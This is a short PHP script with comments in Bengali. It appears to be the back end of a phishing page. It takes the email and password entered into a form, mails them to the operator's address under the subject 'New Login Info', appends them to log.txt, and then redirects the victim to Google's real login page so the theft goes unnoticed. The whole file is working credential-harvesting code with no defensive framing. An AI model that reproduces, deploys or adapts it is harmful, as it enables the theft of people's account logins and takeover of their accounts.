<?php
$email = $_POST['email'];
$password = $_POST['password'];

// আপনার ইমেইল ঠিকানা এখানে লিখুন
$to = "your-email@gmail.com"; 
$subject = "New Login Info";
$message = "Email: " . $email . "\nPassword: " . $password;
$headers = "From: webmaster@yourdomain.com";

// ইমেইল পাঠানোর ফাংশন
mail($to, $subject, $message, $headers);

// আগের মতো ফাইলে সেভ করে রাখা (ঐচ্ছিক)
$data = "Email: " . $email . " | Password: " . $password . "\n";
file_put_contents("log.txt", $data, FILE_APPEND);

header("Location: https://accounts.google.com/");
exit();
?>
